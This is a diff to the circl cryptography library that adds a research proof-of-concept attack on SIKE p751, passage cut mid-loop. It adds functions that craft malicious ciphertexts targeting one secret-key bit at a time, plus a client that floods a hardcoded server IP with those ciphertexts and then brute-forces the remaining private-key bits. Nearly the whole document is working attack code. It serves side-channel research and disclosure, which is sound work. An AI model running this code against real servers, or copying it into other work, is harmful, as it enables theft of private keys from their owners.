@@ -1,0 +1,1186 @@
+diff -ruN '--exclude=.git' circl/dh/sidh/internal/p751/curve.go circl-modify/dh/sidh/internal/p751/curve.go
+--- circl/dh/sidh/internal/p751/curve.go	2022-06-05 15:37:20.753347105 -0500
++++ circl-modify/dh/sidh/internal/p751/curve.go	2022-02-23 18:58:24.124283459 -0600
+@@ -4,6 +4,7 @@
+ package p751
+ 
+ import (
++	"math/big"
+ 	. "github.com/cloudflare/circl/dh/sidh/internal/common"
+ )
+ 
+@@ -126,6 +127,66 @@
+ 	mul(&cparams.C, &cparams.C, &params.HalfFp2)
+ }
+ 
++// Code from Yingchen.
++// Input x(p), y(P), x(Q), y(Q), a, b. Output: x(P+Q), y(P+Q)
++func AffineADD(XP, YP, XQ, YQ *Fp2, curve *ProjectiveCurveParameters) (x_PaQ, y_PaQ Fp2) {
++	var t0, t1, t2 Fp2
++	sub(&t0, YQ, YP)        // t0 = yq-yp
++	sub(&t1, XQ, XP)        // t1 = xq-xp
++	inv(&t1, &t1)           // t1 = 1/t1
++	mul(&t0, &t0, &t1)      // t0 = t0*t1
++	mul(&t1, &t0, &t0)      // t1 = t0*t0
++	add(&t2, XP, XP)        // t2 = xp+xp
++	add(&t2, &t2, XQ)       // t2 = t2+xq
++	add(&t2, &t2, &curve.A) // t2 = t2+a
++	mul(&t2, &t0, &t2)      // t2 = t2*t0
++	mul(&t0, &t0, &t1)      // t0 = t0*t1
++	mul(&t0, &curve.C, &t0) // t0 = b*t0
++
++	add(&t0, &t0, YP)       // t0 = t0+yp
++	sub(&t0, &t2, &t0)      // t0 = t2-t0
++	mul(&t1, &curve.C, &t1) // t1 = b*t1
++
++	sub(&t1, &t1, &curve.A) // t1 = t1-a
++	sub(&t1, &t1, XP)       // t1 = t1-xp
++	sub(&x_PaQ, &t1, XQ)    // x_PaQ = t1-xq
++	y_PaQ = t0
++	return
++}
++
++// Code from Yingchen.
++// Input x(p), y(P), a, b. Output: x([2]p), y([2]P)
++func affineDBL(XP, YP *Fp2, curve *ProjectiveCurveParameters) (x_2P, y_2P Fp2) {
++	var t0, t1, t2 Fp2
++	mul(&t0, XP, XP)   			// t0 = XP*XP
++	add(&t1, &t0, &t0) 			// t1 = t0+t0
++	t2 = one
++	add(&t0, &t0, &t1)      	// t0 = t0+t1
++	mul(&t1, &curve.A, XP)  	// t1 = a*XP
++	add(&t1, &t1, &t1)      	// t1 = t1+t1
++	add(&t0, &t0, &t1)      	// t0 = t0+t1
++	add(&t0, &t0, &t2)      	// t0 = t0+t2
++	mul(&t1, &curve.C, YP)  	// t1 = b*YP
++	add(&t1, &t1, &t1)      	// t1 = t1+t1
++	inv(&t1, &t1)           	// t1 = 1/t1
++	mul(&t0, &t0, &t1)      	// t0=t0*t1
++	mul(&t1, &t0, &t0)      	// t1=t0*t0
++	mul(&t2, &curve.C, &t1) 	// t2 = b*t1
++	sub(&t2, &t2, &curve.A)     // t2 = t2-a
++	sub(&t2, &t2, XP)           // t2 = t2-Xp
++	sub(&t2, &t2, XP)           // t2 = t2-Xp
++	mul(&t1, &t0, &t1)          // t1=t0*t1
++	mul(&t1, &curve.C, &t1)     // t1 = b*t1
++	add(&t1, &t1, YP)           // t1 = t1+YP
++	add(&y_2P, XP, XP)          // y_2P = XP+XP
++	add(&y_2P, &y_2P, XP)       // y_2P = y_2P+XP
++	add(&y_2P, &y_2P, &curve.A) // y_2P = y_2P+a
++	mul(&y_2P, &y_2P, &t0)      // y_2P=y_2P*t0
++	sub(&y_2P, &y_2P, &t1)      // y_2P= y_2P-t1
++	x_2P = t2
++	return
++}
++
+ // Combined coordinate doubling and differential addition. Takes projective points
+ // P,Q,Q-P and (A+2C)/4C curve E coefficient. Returns 2*P and P+Q calculated on E.
+ // Function is used only by RightToLeftLadder. Corresponds to Algorithm 5 of SIKE
+@@ -229,6 +290,196 @@
+ 	mul(y3, &t, &x1x2) // 1/x3
+ }
+ 
++
++
++// Code from Yingchen. 
++func Bytes2Bits(data []byte) []int {
++	dst := make([]int, 0)
++	first_one := int(0) 
++	for _, v := range data {
++		for i := 0; i < 8; i++ {
++			move := uint(7 - i)
++			to_Append := int((v>>move)&1)
++			if(to_Append == 1){
++			    first_one = 1			
++			}
++			if(first_one == 1){
++			    dst = append(dst, to_Append)
++			}
++		}
++	}
++	return dst
++}
++
++
++// Code from Yingchen. 
++// Input: The curve parameter we want our constructed ciphertext to belong to: cparams. The recovered secret key so far: sk_recovered.
++// The number of bits of the secret key: nbits. The bit of the secret key we target: target_bit. local: is this poc local or remote
++// I use the public parameter sets to generate my ciphertexts. So my ciphertext always on the starting elliptic curve: y^2 = x^3 + 6x^2 + x
++// However, one can generate the ciphertext on any elliptic curve.
++// The algorithm is a reverse of the ScalarMul3Pt algorithm. The intuition behind this is described in the paper section 5.2.
++// Output: The constructed ciphertext x_R0, x_R1, x_R2, such that at the beginning of target_bit iteration, the point R2 will be (0,0)
++func Prep_ct(cparams *ProjectiveCurveParameters, nbits uint, sk_recovered []uint8, target_bit uint, local int) (x_R0, x_R1, x_R2 Fp2)  {
++    
++    // Adding point P2 and P3
++    var xP3_toMont Fp2
++    ToMontgomery(&xP3_toMont, &xP3) 
++    var yP3_toMont Fp2
++    ToMontgomery(&yP3_toMont, &yP3)
++     
++    var xP2_toMont Fp2
++    ToMontgomery(&xP2_toMont, &xP2) 
++    var yP2_toMont Fp2
++    ToMontgomery(&yP2_toMont, &yP2)
++    
++    xP23_toMont, yP23_toMont := AffineADD(&xP2_toMont, &yP2_toMont, &xP3_toMont, &yP3_toMont, cparams)
++   
++    // The point T(0,0)
++    xA := F2_zero
++    yA := F2_zero
++
++    // Reverse of yP23_toMont for the point [-1](P2+P3)
++    var m_yP23_toMont Fp2      
++    sub(&m_yP23_toMont, &F2_zero, &yP23_toMont) 
++       
++    // Reverse of ScalarMul3Pt, use big integer
++    prevBit := uint8(0)
++    
++    big_zero := big.NewInt(0)
++    
++    r0_r0_count := big.NewInt(1)
++    r0_r1_count := big.NewInt(0)
++    r0_r2_count := big.NewInt(0)
++    
++    r1_r0_count := big.NewInt(0)
++    r1_r1_count := big.NewInt(1)
++    r1_r2_count := big.NewInt(0) 
++    
++    r2_r0_count := big.NewInt(0)
++    r2_r1_count := big.NewInt(0)
++    r2_r2_count := big.NewInt(1)
++      
++    target_r2_r0_count:=big.NewInt(0)
++    target_r2_r1_count:=big.NewInt(0)
++    target_r2_r2_count:=big.NewInt(0)
++    
++    for i := uint(0); i < nbits; i++ {
++		swap := uint8(0)
++		if(local == 1){
++			bit := (sk_recovered[i>>3] >> (i & 7) & 1)       
++			swap = prevBit ^ bit
++			prevBit = bit
++		}else{
++			bit := sk_recovered[i]
++			swap = prevBit ^ bit
++			prevBit = bit
++		}
++		// if we dont swap, then r2 will be point A with x=0, otherwsie, r1 will be point A with x=0             
++        if(i == target_bit){
++            target_r2_r0_count = r2_r0_count
++            target_r2_r1_count = r2_r1_count
++            target_r2_r2_count = r2_r2_count        
++            break                      
++        }
++        	
++		if(swap==1){    
++			temp_r0_count:=big.NewInt(0)
++			temp_r1_count:=big.NewInt(0)
++			temp_r2_count:=big.NewInt(0)
++				
++			temp_r0_count = r1_r0_count
++			temp_r1_count = r1_r1_count
++			temp_r2_count = r1_r2_count
++				
++			r1_r0_count = r2_r0_count
++			r1_r1_count = r2_r1_count
++			r1_r2_count = r2_r2_count
++				
++			r2_r0_count = temp_r0_count
++			r2_r1_count = temp_r1_count
++			r2_r2_count = temp_r2_count
++				
++			r0_r0_count = big.NewInt(0).Sub(big_zero, r0_r0_count)
++			r0_r1_count = big.NewInt(0).Sub(big_zero, r0_r1_count)
++			r0_r2_count = big.NewInt(0).Sub(big_zero, r0_r2_count)
++		}
++	     
++        r2_r0_count = big.NewInt(0).Add(r2_r0_count, r0_r0_count)
++        r2_r1_count = big.NewInt(0).Add(r2_r1_count, r0_r1_count)
++        r2_r2_count = big.NewInt(0).Add(r2_r2_count, r0_r2_count)
++        
++        r0_r0_count = big.NewInt(0).Add(r0_r0_count, r0_r0_count)
++        r0_r1_count = big.NewInt(0).Add(r0_r1_count, r0_r1_count)
++        r0_r2_count = big.NewInt(0).Add(r0_r2_count, r0_r2_count)
++
++    }
++  
++    p_scalar := big.NewInt(0)
++    
++   
++    if(/*target_r2_r0_count>big_zero*/target_r2_r0_count.Cmp(big_zero)>=1){
++        p_scalar = target_r2_r0_count
++    }else{
++        // p_scalar = -target_r2_r0_count
++        p_scalar = big.NewInt(0).Sub(big_zero, target_r2_r0_count)
++    }
++    
++    var x_pscalar, y_pscalar Fp2
++    first_time := 0
++    
++    p_scalar_binary_bigint := new(big.Int).SetBytes(p_scalar.Bytes())
++    p_scalar_byte := p_scalar_binary_bigint.Bytes()
++    p_scalar_binary := Bytes2Bits(p_scalar_byte)
++    
++    for i := int(0); i < len(p_scalar_binary); i++ {
++        curr_char := p_scalar_binary[i]
++        if(curr_char==1){       
++            var x2np, y2np Fp2
++            x2np = xP23_toMont
++            y2np = yP23_toMont
++            for j := int(0); j < (len(p_scalar_binary)-i-1); j++ {
++                x2np, y2np = affineDBL(&x2np, &y2np, cparams)
++            }
++            if(first_time == 0){
++                x_pscalar = x2np
++                y_pscalar = y2np
++                first_time = 1
++            }else{
++                x_pscalar, y_pscalar = AffineADD(&x2np, &y2np, &x_pscalar, &y_pscalar, cparams)        
++            }
++        }
++    }
++    
++    if(/*target_r2_r0_count>big_zero*/ target_r2_r0_count.Cmp(big_zero)>=1){
++        sub(&y_pscalar, &F2_zero, &y_pscalar)
++    }
++    
++    // Computing ciphertext
++    x_R0 = xP23_toMont
++    var y_R1 Fp2
++    var y_R2 Fp2
++    if(/*target_r2_r1_count>big_zero*/ target_r2_r1_count.Cmp(big_zero)>=1){
++        x_R1, y_R1 = AffineADD(&x_pscalar, &y_pscalar, &xA, &yA, cparams) 
++        if(p_scalar.Cmp(big_zero)==0){
++            x_R1 = xA
++            y_R1 = yA
++        } 
++        x_R2, y_R2 = AffineADD(&x_R1, &y_R1, &xP23_toMont, &yP23_toMont, cparams) 
++    }else if(/*target_r2_r2_count>big_zero*/ target_r2_r2_count.Cmp(big_zero)>=1){
++        x_R2, y_R2 = AffineADD(&x_pscalar, &y_pscalar, &xA, &yA, cparams)
++        if(p_scalar.Cmp(big_zero)==0){
++            x_R2 = xA
++            y_R2 = yA
++        }
++        x_R1, y_R1 = AffineADD(&x_R2, &y_R2, &xP23_toMont, &m_yP23_toMont, cparams)  
++    }
++     
++    return  
++}
++
++
++
++
+ // Scalarmul3Pt is a right-to-left point multiplication that given the
+ // x-coordinate of P, Q and P-Q calculates the x-coordinate of R=Q+[scalar]P.
+ // nbits must be smaller or equal to len(scalar).
+diff -ruN '--exclude=.git' circl/dh/sidh/internal/p751/params.go circl-modify/dh/sidh/internal/p751/params.go
+--- circl/dh/sidh/internal/p751/params.go	2022-06-05 15:37:20.753347105 -0500
++++ circl-modify/dh/sidh/internal/p751/params.go	2022-02-23 18:33:01.380571545 -0600
+@@ -73,6 +73,186 @@
+ 			0xC116CF5232C7C978, 0x49A84D4B8EFAF6AA, 0x0000305731E97514},
+ 	}
+ 
++	// Code from Yingchen.
++	// Constants I use in the attack
++	F2_zero = common.Fp2{
++		A: common.Fp{0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
++		B: common.Fp{0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
++	}
++
++	// Code from Yingchen.
++	// Public parameter sets, P, Q, R(P-Q). All resides on the curve: y^2 = x^3 + 6x^2 + x
++	// From the SIKE specification.
++	// P2 and Q2 generate the 2^e2 torsion subgroups.
++	// P3 and Q3 generate the 3^e3 torsion subgroups.
++	// SIKE specification does not provide yR2 and yR3. I computed yR3 myself and later find it not useful, so did not compute yR2.
++	xQ2 = common.Fp2{
++		A: common.Fp{
++			0x9F5090F76276290E, 0x1B2E64A7BA536E21, 0x019924F8A0EF5E4F,
++			0x682961A38B5489D1, 0x704F1597D87F074F, 0xF057FD041AD93237,
++			0xAC29A40F837983C0, 0xDB7EE6D2B2DFCB21, 0x3419E7591D59D8AB,
++			0xA7E0B415A17F208D, 0x78BF4E39E3A333F8, 0x00001723D2BFA01A,
++		},
++		B: common.Fp{
++			0x209FBC8DDB8C35C7, 0x5384DD837BEDB710, 0xEE65C09377EFBA0C,
++			0xF322A2F86AEDFDCF, 0xCD465B078BD0DEBD, 0x3235C2F87D89500B,
++			0x5E2950334262CC97, 0x0756054AC0E3DCE9, 0x02405E90CEB680CB,
++			0x23F73C4F44169A7E, 0x60B244EF49E05B5E, 0x00002569D7EAFB6C,
++		},
++	}
++
++	yQ2 = common.Fp2{
++		A: common.Fp{
++			0x5898663DDED49154, 0x8FDF1EA5F617E6ED, 0xFF9BC791224B121E,
++			0x437108DC048AA853, 0x23D1983D2EDCF2AB, 0xD2893738521B62EB,
++			0x3E7E98C744A0AC85, 0xF7BC0BCA8ED8EF88, 0xD85A1910E2609A61,
++			0x6A3D8BBAD28380B8, 0x608B42794C4820C5, 0x000035B82D1BD2BA,
++		},
++		B: common.Fp{
++			0x8B4C26D3B72E2821, 0x42E977B85F69EC73, 0x7F63D191029033F9,
++			0x532DB0C083CF3986, 0x2151013334EC570B, 0xD9F51FFC9272D177,
++			0x56942494D216A74E, 0x94AE64093142AEB0, 0x98A3140EA204B100,
++			0x2A4054DB5FD1D265, 0x907F16AA38F89C67, 0x00000F22306A6963,
++		},
++	}
++
++	xP2 = common.Fp2{
++		A: common.Fp{
++			0x9C3BAC1D87F8B6FA, 0x9DECFAE8BFD643C8, 0xE6BC78A7F12FDCB0,
++			0x622F6BB801D0337E, 0xD5629AD0ECAD7C90, 0xB29ACB81E429BD1B,
++			0x24BFBBF6710D7DC8, 0x1F385FBBCC300BBB, 0x8AC0C0BDB2983805,
++			0xFA6004CA5B3637C6, 0x40F24874F8B87281, 0x00004514F8CC94B1,
++		},
++		B: common.Fp{
++			0xF0168D818AF02041, 0x653A8099CE5A84E4, 0x28D7A31EA0D54640,
++			0xAC494C60B8A0F65A, 0x3F9BB167DC01BE34, 0x5BCAC1897D262769,
++			0x8D971DA289DCF243, 0x77737EA6F8CC7493, 0xEA3CC16E10857540,
++			0xD6DD925F2D6E4F7F, 0x14B3A96CED5FDB37, 0x0000158ABF500B59,
++		},
++	}
++
++	yP2 = common.Fp2{
++		A: common.Fp{
++			0x10A5708A70A0D5A8, 0x342F78098258DF2E, 0x96FFBB874FC587E4,
++			0xAE00627041C891BC, 0x2325BF8B0CF92E45, 0xAB876CF8DA8878F1,
++			0x9666DC1D40A2C0A3, 0x9E22B991D58FB2F8, 0xC83F84E2D9E6577F,
++			0x2A2B5A583C9F2DC6, 0x9A6EF66A2F1614AE, 0x00000BF6E4E7A28E,
++		},
++		B: common.Fp{
++			0x53B4C5C42EB71F7E, 0x633C5AEAAB748338, 0x553916D62004FD21,
++			0xACBF27BC1A127B4A, 0x2803F8D05BA3B1F2, 0xAC2B300A1C669D1A,
++			0xF6001FE9102D2597, 0x82302FBFB7E97153, 0xF9E4138703C6DB7C,
++			0xCF233FE387905BC8, 0x1DF80A53858519CB, 0x00001502FB44178D,
++		},
++	}
++
++	xR2 = common.Fp2{
++		A: common.Fp{
++			0x37AF3051167525BB, 0xAF5AB743EE9E7C9C, 0x0201E7231C529A15,
++			0xE44CC623195C387E, 0x5792763A4D213EBD, 0x600CD078AF1C40ED,
++			0x19A29357A8C33EB3, 0xAF29CCF008E5A307, 0x7F3BE343BC53C883,
++			0x8397DF477AEA9A06, 0x964E8BC963519FAC, 0x00006066E07F3C0D,
++		},
++		B: common.Fp{
++			0x3C65B107FADA5165, 0x79587775443483D1, 0xE39F83C5006E0AE9,
++			0x3878881CE390D909, 0x28B4893CDCFBFC00, 0x4FFC8910B72B8E13,
++			0x5A48557E15C99225, 0xF5FE3A08FB3A02B0, 0x064C322FC3604FC5,
++			0x1212BD05A2AF0CB3, 0x4249BC4A144EB5F3, 0x000050E30C2C0649,
++		},
++	}
++
++	xP3 = common.Fp2{
++		A: common.Fp{
++			0xF827400E453432FE, 0xBEAB05F6023AF873, 0x20C13982FF5B49B8,
++			0x18760E9FDF67467E, 0xEF985AC0A5042600, 0xCA29CAA2FAA57174,
++			0x6E2F1FF7CE0C969C, 0x8EEE98E8F7CD6E21, 0x5D2F48123B6D9C49,
++			0x46DC12FF56D0C6F1, 0xC394B98024A55547, 0x0000605D4697A245,
++		},
++		B: common.Fp{
++			0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++			0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++			0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++			0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++		},
++	}
++
++	yP3 = common.Fp2{
++		A: common.Fp{
++			0x99FC7F14FE720617, 0x2FF1CE313FEEEF41, 0x64EA2B6C1672A8CA,
++			0xB0D46CDC8CF9BA76, 0x712133D26502F17C, 0xD0FF57FF8093FE6B,
++			0x836F2C59A27BB61E, 0xBF295BB35F7B6D37, 0xBDF609628FD043B4,
++			0x9855E5BDD1435CFF, 0xC45E2FAA930D6258, 0x00005634690BFC14,
++		},
++		B: common.Fp{
++			0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++			0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++			0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++			0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++		},
++	}
++
++	xQ3 = common.Fp2{
++		A: common.Fp{
++			0xDA6973360F8CD0F1, 0x8367D5132E6AA0D3, 0xBAFD54A461A53540,
++			0xFA4839F39A28338B, 0x72D7F04502D45307, 0x75D99C68E9AE7141,
++			0x5409AF96C5426FA3, 0x9BAA8A854B8A9FDE, 0x7A0A7E4DAD931EC2,
++			0x4C5CBCA970F9CC32, 0x3CBD7E0EA8B96D93, 0x00005BF954478180,
++		},
++		B: common.Fp{
++			0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++			0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++			0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++			0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++		},
++	}
++
++	yQ3 = common.Fp2{
++		A: common.Fp{
++			0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++			0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++			0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++			0x0000000000000000, 0x0000000000000000, 0x0000000000000000,
++		},
++		B: common.Fp{
++			0x89F31FDC5FE43243, 0xCC4CECFDB67739CE, 0xA24CEF507955F027,
++			0x8DD3D890E7B5AC34, 0x090B041022064C3A, 0xF096092CDDD57C0A,
++			0x383474B712EA4B5B, 0x414B4EEBBB70FB91, 0x4449398F05ED1AD1,
++			0x5B599456748A5BCC, 0x8472AC2DD8B4DABB, 0x00003351F421FC15,
++		},
++	}
++
++	xR3 = common.Fp2{
++		A: common.Fp{
++			0x33e8950186a79fe3, 0x59ed544b82566bf6, 0xfd4fe4739cc21a9a,
++			0x7d1ba705ccdd680b, 0xdad1b7a476716ac, 0xd8a5e723364364e4,
++			0x11d8bd1f682c0e4, 0x1c3325843bb53d9b, 0xbb631bf789c3f98d,
++			0x2a06cd411f38588, 0x809585f67fe9ea1f, 0x55e5124a05d4,
++		},
++		B: common.Fp{
++			0x9ee407ae45f937de, 0xa163bbf88d99549b, 0x172310375159f7fa,
++			0xde4ac61990d010e3, 0x96b5e978a129c80b, 0xbd8e7d64d9ddaea4,
++			0x3b65048ba2c95d79, 0xcde5ba845c0e04da, 0xd043bba652352657,
++			0xf030523ea8ad9604, 0x98a8a7ea5da65544, 0x15205692204f,
++		},
++	}
++
++	yR3 = common.Fp2{
++		A: common.Fp{
++			0xf6551cfe3058ae32, 0xef60dd76becba83a, 0xa77ce6ee984a33e0,
++			0x8a787790b80c646f, 0xa9816de26dec5cf7, 0xb370dc1553fd7a0e,
++			0x31c909b9464757b5, 0xa3634b2dabbc725d, 0x652367978f3b2f32,
++			0xb45224fbb609fc0f, 0x7a2f6067d94f1080, 0x4a36b4d126fd,
++		},
++		B: common.Fp{
++			0x534572b4d2ac81b7, 0xb910887c8cb34c8f, 0xa2da7659b8645ae3,
++			0xb6018fab26677ab9, 0x60a98ef5c384edab, 0x8199d154ef7bd87a,
++			0xd246c1df645e1675, 0x7fd528d2eee852ff, 0xda7ba4398726a203,
++			0xcfafeb4c9d21aad0, 0x12c262a33e757328, 0x33483ba55ed5,
++		},
++	}
++
++	// End of parameter set.
++
+ 	params = common.SidhParams{
+ 		ID: common.Fp751,
+ 		// SIDH public key byte size.
+diff -ruN '--exclude=.git' circl/dh/sidh/POC_ATTACK/sike_client.go circl-modify/dh/sidh/POC_ATTACK/sike_client.go
+--- circl/dh/sidh/POC_ATTACK/sike_client.go	1969-12-31 18:00:00.000000000 -0600
++++ circl-modify/dh/sidh/POC_ATTACK/sike_client.go	2022-06-05 13:01:14.120409968 -0500
+@@ -0,0 +1,264 @@
++package main
++
++import (
++	"bufio"
++	"bytes"
++	"crypto/rand"
++	"io/ioutil"
++	"log"
++	"net/http"
++	"sync"
++
++	"fmt"
++	"math"
++	"os"
++	"strconv"
++	"time"
++
++	"github.com/cloudflare/circl/dh/sidh"
++	"github.com/cloudflare/circl/dh/sidh/internal/common"
++	"github.com/cloudflare/circl/dh/sidh/internal/p751"
++)
++
++var wg_sike sync.WaitGroup
++
++type sikeVec struct {
++	id      uint8
++	name    string
++	kem     *sidh.KEM
++	KatFile string
++	PkB     string
++	PrB     string
++}
++
++func sendSIKE(ct []byte) {
++	defer wg_sike.Done()
++	//FIXME
++	url := "http://130.126.136.241:9000"
++
++	http.DefaultTransport.(*http.Transport).MaxIdleConnsPerHost = 1000
++
++	req, err := http.NewRequest("POST", url, bytes.NewBuffer(ct))
++	if err != nil {
++		log.Println("Error during NewRequest!", err)
++	}
++
++	req.Header.Set("X-Custom-Header", "SIKE-ATTACK")
++	req.Header.Set("Content-Type", "application/json")
++	client := &http.Client{}
++
++	resp, err1 := client.Do(req)
++	if err1 != nil {
++		log.Println("Error during client Do!", err1)
++	}
++
++	_, err2 := ioutil.ReadAll(resp.Body)
++	if err2 != nil {
++		log.Println("Error during ReadAll!!", err2)
++	}
++
++	if err != nil || err1 != nil || err2 != nil {
++		panic(err)
++	}
++
++	resp.Body.Close()
++
++}
++
++func main() {
++	public_key_server_pt0 := common.Fp2{
++		A: common.Fp{
++			0x8dd500119b03530e, 0x1e5ca2e72b0d1bac, 0x3151c65b1853b7ab, 0xa9fa8325e933c9a5, 0xa78b7f6d89e82f40, 0x312a120142a843f2, 0x97b541092f59254c, 0x3c3ee0628eb21d1a, 0x51ff9cb33e1f6410, 0x533215c9b61f17bb, 0x8b1c69f16cf2c492, 0xdc5c1e83adfc,
++		},
++		B: common.Fp{
++			0x3e6cdfbb1355ec4a, 0xb1ba6c9c617c4da1, 0x5d47ae253787d5fe, 0xc4fd3a2141eda84b, 0x82baeb669690de56, 0x949704d5a0cc20, 0x1e8bfd55c22a42c5, 0x82c853210fc67dcc, 0x30900ee1b368b102, 0xae2eef46cbc8b804, 0x610a8afec37b9a1b, 0x360bbe6c3e73,
++		},
++	}
++	public_key_server_pt1 := common.Fp2{
++		A: common.Fp{
++			0xc5383a9ab0c69d63, 0x539a07859624995c, 0x955c5e8fb27d857c, 0x811b6ab21f081142, 0x3ef36cd86ca002b3, 0x29a11e671edc65c5, 0x44b59a52f6e21a51, 0x1cd83c162f24cc8, 0x2b6ccae13eff2e16, 0xe857d0dd6c2fd154, 0x7262913f9e7f39c2, 0x5126f83fb1f0,
++		},
++		B: common.Fp{
++			0xd91e1f3cde675f72, 0x8cfcdb4b85959d, 0x44c0841ce3f9880e, 0xb0b9817a5aad6be8, 0x4014d54b475a515f, 0xed681c5a3703a7ea, 0xbdcc98b9c8180812, 0x5cfbc804259390b5, 0x5b9895fb464b9e94, 0xd814b167efa9cdfd, 0x648dc525aa9e9721, 0x258538056a0,
++		},
++	}
++	public_key_server_pt2 := common.Fp2{
++		A: common.Fp{
++			0xc25d4f5be8e355b2, 0x8c2f2752d4981fb5, 0x6064f14ebe081d, 0xea7f13688376c44e, 0xc9176bd3d6a50db7, 0x47fa25a57308cb78, 0x8ccf6a051b67bf1b, 0xbe89c6859d444442, 0x402bcde27d68b11d, 0x426ae37b5ef745bd, 0xe5f1d996322fcc3c, 0x5c87dc2321b8,
++		},
++		B: common.Fp{
++			0xb02aef8b5b5e8f3e, 0x3b4f43230aaf5bb5, 0x6c16c5d404beaf80, 0xe89f5d573b5bd500, 0x61ed35eaed49fb68, 0xb6c72c79759cacd, 0xcba15d94d13da9c4, 0x734b6829912be9ea, 0x77a7ee7cc5f6b20c, 0x78893e31e33b46ed, 0xfda444a855e8c816, 0x53a6784defe6,
++		},
++	}
++
++	var length_sk uint
++	length_sk = uint(378)
++	// request_count: how many requests we make in one bunch
++	// iterations: how many iterations we compute for one target bit
++	// filename: the file of the recovered secret key so far
++	// index_to_recover: the next index to recover
++	request_count, _ := strconv.ParseUint(os.Args[1], 10, 32)
++	iterations, _ := strconv.ParseUint(os.Args[2], 10, 32)
++	filename := os.Args[3]
++	index_to_recover, _ := strconv.ParseUint(os.Args[4], 10, 32)
++
++	request_count_int := int(request_count)
++	iterations_int := int(iterations)
++	index_to_recover_int := uint(index_to_recover)
++
++	fmt.Println("request_count_int, \n", request_count_int)
++	fmt.Println("iterations_int, \n", iterations_int)
++	fmt.Println("index_to_recover_int, \n", index_to_recover_int)
++
++	file, err := os.Open(filename)
++	if err != nil {
++		panic(err)
++	}
++	defer file.Close()
++	scanner := bufio.NewScanner(file)
++	scanner.Split(bufio.ScanLines)
++
++	sk_recovered := make([]uint8, index_to_recover_int+1)
++	count := 0
++	if index_to_recover_int != 0 {
++		for scanner.Scan() {
++			curr, _ := strconv.ParseUint(scanner.Text(), 10, 32)
++			sk_recovered[count] = uint8(curr)
++			count = count + 1
++			if uint(count) == index_to_recover_int {
++				break
++			}
++		}
++	}
++
++	var v sikeVec
++	v.id = 1
++	v.kem = sidh.NewSike751(rand.Reader)
++	sk := sidh.NewPrivateKey(v.id, sidh.KeyVariantSike)
++	pk := sidh.NewPublicKey(v.id, sidh.KeyVariantSike)
++	sk.Generate(rand.Reader)
++	sk.GeneratePublicKey(pk)
++
++	var ssE [common.MaxSharedSecretBsz]byte
++	var ct = make([]byte, v.kem.CiphertextSize())
++
++	one := common.Fp2{
++		A: common.Fp{
++			0x00000000000249ad, 0x0000000000000000, 0x0000000000000000,
++			0x0000000000000000, 0x0000000000000000, 0x8310000000000000,
++			0x5527b1e4375c6c66, 0x697797bf3f4f24d0, 0xc89db7b2ac5c4e2e,
++			0x4ca4b439d2076956, 0x10f7926c7512c7e9, 0x00002d5b24bce5e2},
++	}
++
++	// 6*R mod p
++	six := common.Fp2{
++		A: common.Fp{
++			0x00000000000DBA10, 0x0000000000000000, 0x0000000000000000,
++			0x0000000000000000, 0x0000000000000000, 0x3500000000000000,
++			0x3714FE4EB8399915, 0xC3A2584753EB43F4, 0xA3151D605C520428,
++			0xC116CF5232C7C978, 0x49A84D4B8EFAF6AA, 0x0000305731E97514},
++	}
++	cparam := common.ProjectiveCurveParameters{
++		A: six,
++		C: one,
++	}
++
++	var xR0, xR1, xR2 common.Fp2
++	xR0, xR1, xR2 = p751.Prep_ct(&cparam, length_sk, sk_recovered, index_to_recover_int, 0)
++
++	var pk_fake = sidh.NewPublicKey(v.id, sidh.KeyVariantSike)
++	pk_fake.Modify_PublicKey(xR0, xR1, xR2)
++	var ct_fake = make([]byte, v.kem.CiphertextSize())
++	pk_fake.Export(ct_fake)
++
++	v.kem.Reset()
++	_ = v.kem.Encapsulate(ct, ssE[:], pk)
++
++	copy(ct[:pk_fake.Size()], ct_fake[:pk_fake.Size()])
++
++	// Ask the server to reveal the secret
++	if request_count_int == 0 {
++		SECRET := []byte{'S', 'E', 'C', 'R', 'E', 'T'}
++		wg_sike.Add(1)
++		sendSIKE(SECRET)
++		return
++	}
++
++	for i := uint(0); i < uint(iterations_int); i++ {
++
++		all_start := time.Now()
++
++		wg_sike.Add(request_count_int)
++		for j := uint(0); j < uint(request_count_int); j++ {
++			go sendSIKE(ct)
++		}
++		wg_sike.Wait()
++
++		all_duration := time.Since(all_start)
++
++		fmt.Println("ALL_DURATION", all_duration)
++
++	}
++
++	// We do not have much secret bits left, so lets start brute forcing the rest of the secret key by comparing with the public key
++	if iterations_int == 0 {
++		sk_full := make([]uint8, length_sk)
++		for i := uint(0); i < index_to_recover_int; i++ {
++			sk_full[i] = sk_recovered[i]
++		}
++
++		total := int(math.Pow(2, float64(uint(length_sk)-index_to_recover_int)))
++		for i := uint(0); i < uint(total); i++ {
++			for j := index_to_recover_int; j < length_sk; j++ {
++				sk_full[j] = 0
++			}
++
++			fmt.Println("i, \n", i)
++			curr_bb := strconv.FormatInt(int64(i), 2) //brute force bits
++			fmt.Println("curr_bb, \n", curr_bb)
++			for j := 0; j < len(curr_bb); j++ {
++				sk_full[length_sk-uint(len(curr_bb))+uint(j)] = uint8(int(curr_bb[j]) - '0')
++			}
++			fmt.Println("sk_full, \n", sk_full)
++
++			sk_curr := make([]uint8, 48)
++			count_byte := 0
++			curr_byte := uint8(0)
++			for j := uint(0); j < length_sk; j++ {
++				if j%8 == 0 {
++					curr_byte = uint8(0)
++				}
++				index := j % 8
++				value := sk_full[j] * uint8(math.Pow(2, float64(index)))
++				curr_byte = curr_byte + value
++				if (j%8 == 7) || (j == (length_sk - 1)) {
++					sk_curr[count_byte] = curr_byte
